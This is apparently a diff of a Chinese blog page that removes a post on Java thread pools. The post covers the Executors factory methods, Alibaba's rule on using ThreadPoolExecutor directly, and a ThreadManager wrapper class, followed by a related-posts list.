-<p>1、单线程<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建一个单线程的线程池.</span></span><br><span class="line"><span class="comment"> * 这个线程池只有一个线程在工程,也就是相当于单线程串行执行所有任务.</span></span><br><span class="line"><span class="comment"> * 如果这个唯一的线程因为异常结束,那么会有一个新的线程来替代它.</span></span><br><span class="line"><span class="comment"> * 此线程池保证所有任务的执行顺序都会按照提交的顺序执行.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title">newSingleThreadExecutor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> FinalizableDelegatedExecutorService (<span class="keyword">new</span> ThreadPoolExecutor(<span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">                <span class="keyword">new</span> LinkedBlockingQueue&lt;Runnable&gt;()));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
-<p>2、固定数目线程<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建固定大小的线程池.</span></span><br><span class="line"><span class="comment"> * 每次提交一个任务就会创建一个线程,直到线程达到线程池的最大大小.</span></span><br><span class="line"><span class="comment"> * 线程池的大小一旦达到最大值就会保持不变,如果某个线程因为异常而技术,</span></span><br><span class="line"><span class="comment"> * 那么该线程池会补充一个新的线程.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title">newFixedThreadPool</span><span class="params">(<span class="keyword">int</span> nThreads)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ThreadPoolExecutor(nThreads, nThreads,</span><br><span class="line">            <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">            <span class="keyword">new</span> LinkedBlockingQueue&lt;Runnable&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>3、缓存线程<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *创建一个可缓存的线程池.</span></span><br><span class="line"><span class="comment"> *如果线程池的大小超过了处理任务所需要的线程,</span></span><br><span class="line"><span class="comment"> *那么就会回收部分空闲(60秒不执行任务)的线程,</span></span><br><span class="line"><span class="comment"> *当任务数增加时,此线程池又可以智能的添加新线程来处理任务.</span></span><br><span class="line"><span class="comment"> *此线程池不会对线程池大小做限制,</span></span><br><span class="line"><span class="comment"> *线程池大小完全依赖与操作系统(或者说JVM)能够创建的最大线程数.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title">newCachedThreadPool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ThreadPoolExecutor(<span class="number">0</span>, Integer.MAX_VALUE,</span><br><span class="line">            <span class="number">60L</span>, TimeUnit.SECONDS,</span><br><span class="line">            <span class="keyword">new</span> SynchronousQueue&lt;Runnable&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>4、定时线程<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *创建一个大小无限的线程池.此线程池支持定时以及周期性执行任务的需求.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ScheduledThreadPoolExecutor</span><span class="params">(<span class="keyword">int</span> corePoolSize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(corePoolSize, Integer.MAX_VALUE, <span class="number">0</span>, NANOSECONDS, <span class="keyword">new</span> DelayedWorkQueue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>关于线程:</p>
-<ul>
-<li>1.线程并不是越多越好.切换线程的开销很大、如果线程太多、切换时间远大于执行时间就得不偿失了</li>
-<li>2.线程该用才用.跟事物一样.不该用不要用.否则反而降低性能</li>
-<li>3.线程池数量 差不多是 CPU核数 * 2</li>
-<li>4.阿里编码规范已不推荐使用ExcutorService方法使用线程</li>
-</ul>
-<p>{———-}</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">【强制】线程池不允许使用 Executors 去创建，而是通过 ThreadPoolExecutor 的方式，这样</span><br><span class="line">的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险。</span><br><span class="line">说明：Executors 返回的线程池对象的弊端如下：</span><br><span class="line">1）FixedThreadPool 和 SingleThreadPool:</span><br><span class="line">允许的请求队列长度为 Integer.MAX_VALUE，可能会堆积大量的请求，从而导致 OOM。</span><br><span class="line">2）CachedThreadPool 和 ScheduledThreadPool:</span><br><span class="line">允许的创建线程数量为 Integer.MAX_VALUE，可能会创建大量的线程，从而导致 OOM。</span><br></pre></td></tr></table></figure>
-<p>代码地址:<a href="https://gitee.com/none_heart/xingchen/tree/master/excutor" target="_blank" rel="noopener">https://gitee.com/none_heart/xingchen/tree/master/excutor</a></p>
-<pre><code>void execute（）
-
-Future sumbit()
-</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 线程池管理的工具类，封装类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> ThinkPad</span></span><br><span class="line"><span class="comment"> * 线程池的管理 ，通过java 中的api实现管理</span></span><br><span class="line"><span class="comment"> *   采用conncurrent框架： 非常成熟的并发框架 ，特别在匿名线程管理非常优秀的</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadManager</span> </span>&#123;</span><br><span class="line">    <span class="comment">//通过ThreadPoolExecutor的代理类来对线程池的管理</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ThreadPollProxy mThreadPollProxy;</span><br><span class="line">    <span class="comment">//单列对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ThreadPollProxy <span class="title">getThreadPollProxy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (ThreadPollProxy.class) &#123;</span><br><span class="line">            <span class="keyword">if</span>(mThreadPollProxy==<span class="keyword">null</span>)&#123;</span><br><span class="line">                mThreadPollProxy=<span class="keyword">new</span> ThreadPollProxy(<span class="number">3</span>,<span class="number">6</span>,<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> mThreadPollProxy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过ThreadPoolExecutor的代理类来对线程池的管理</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadPollProxy</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> ThreadPoolExecutor poolExecutor;<span class="comment">//线程池执行者 ，java内部通过该api实现对线程池管理</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> corePoolSize;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> maximumPoolSize;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">long</span> keepAliveTime;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">ThreadPollProxy</span><span class="params">(<span class="keyword">int</span> corePoolSize,<span class="keyword">int</span> maximumPoolSize,<span class="keyword">long</span> keepAliveTime)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.corePoolSize=corePoolSize;</span><br><span class="line">            <span class="keyword">this</span>.maximumPoolSize=maximumPoolSize;</span><br><span class="line">            <span class="keyword">this</span>.keepAliveTime=keepAliveTime;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//对外提供一个执行任务的方法</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(Runnable r)</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(poolExecutor==<span class="keyword">null</span>||poolExecutor.isShutdown())&#123;</span><br><span class="line">                poolExecutor=<span class="keyword">new</span> ThreadPoolExecutor(</span><br><span class="line">                        <span class="comment">//核心线程数量</span></span><br><span class="line">                        corePoolSize,</span><br><span class="line">                        <span class="comment">//最大线程数量</span></span><br><span class="line">                        maximumPoolSize,</span><br><span class="line">                        <span class="comment">//当线程空闲时，保持活跃的时间</span></span><br><span class="line">                        keepAliveTime,</span><br><span class="line">                        <span class="comment">//时间单元 ，毫秒级</span></span><br><span class="line">                        TimeUnit.MILLISECONDS,</span><br><span class="line">                        <span class="comment">//线程任务队列</span></span><br><span class="line">                        <span class="keyword">new</span> LinkedBlockingQueue&lt;Runnable&gt;(),</span><br><span class="line">                        <span class="comment">//创建线程的工厂</span></span><br><span class="line">                        Executors.defaultThreadFactory());</span><br><span class="line">            &#125;</span><br><span class="line">            poolExecutor.execute(r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-
-    
-      
-
-  <div class="popular-posts-header">相关文章</div>
-  <ul class="popular-posts">
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2019/05/26/jdk/jdk-model/" rel="bookmark">jdk内存模型</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2019/03/16/jdk/jdk-tree-2/" rel="bookmark">二叉树的深度遍历与广度遍历</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/12/11/jdk/jdk-nio/" rel="bookmark">Java NIO浅析【转】</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/11/01/jdk/jdk-tree/" rel="bookmark">java 红黑树</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/jdk/jdk-annotation/" rel="bookmark">自定义注解</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/jdk/jdk-list/" rel="bookmark">列表List</a></div>
       
     </li>
   
